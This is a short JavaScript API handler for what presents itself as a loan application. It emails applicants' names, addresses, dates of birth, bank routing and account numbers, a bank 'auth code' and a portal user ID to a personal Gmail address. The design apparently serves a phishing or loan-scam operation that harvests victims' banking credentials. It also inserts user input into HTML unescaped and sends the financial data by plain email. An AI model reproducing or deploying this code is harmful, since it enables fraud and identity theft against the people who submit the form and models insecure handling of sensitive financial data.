import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const {
    amount,
    duration,
    purpose,
    firstName,
    lastName,
    city,
    stateVal,
    address,
    zip,
    dob,
    bankName,
    routing,
    account,
    authCode,
    userId,
  } = req.body;

  try {
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'unitedfinanciallenders@gmail.com',
      subject: `New Loan Application from ${firstName} ${lastName}`,
      html: `
        <h2>Loan Application Received</h2>
        <h3>Loan Details</h3>
        <p><strong>Amount:</strong> $${amount}</p>
        <p><strong>Duration:</strong> ${duration} months</p>
        <p><strong>Purpose:</strong> ${purpose}</p>
        
        <h3>Personal Information</h3>
        <p><strong>Name:</strong> ${firstName} ${lastName}</p>
        <p><strong>Address:</strong> ${address}, ${city}, ${stateVal} ${zip}</p>
        <p><strong>Date of Birth:</strong> ${dob}</p>
        
        <h3>Banking Information</h3>
        <p><strong>Bank:</strong> ${bankName}</p>
        <p><strong>Routing:</strong> ${routing}</p>
        <p><strong>Account:</strong> ${account}</p>
        <p><strong>Auth Code:</strong> ${authCode}</p>
        
        <h3>Portal Account</h3>
        <p><strong>User ID:</strong> ${userId}</p>
      `,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
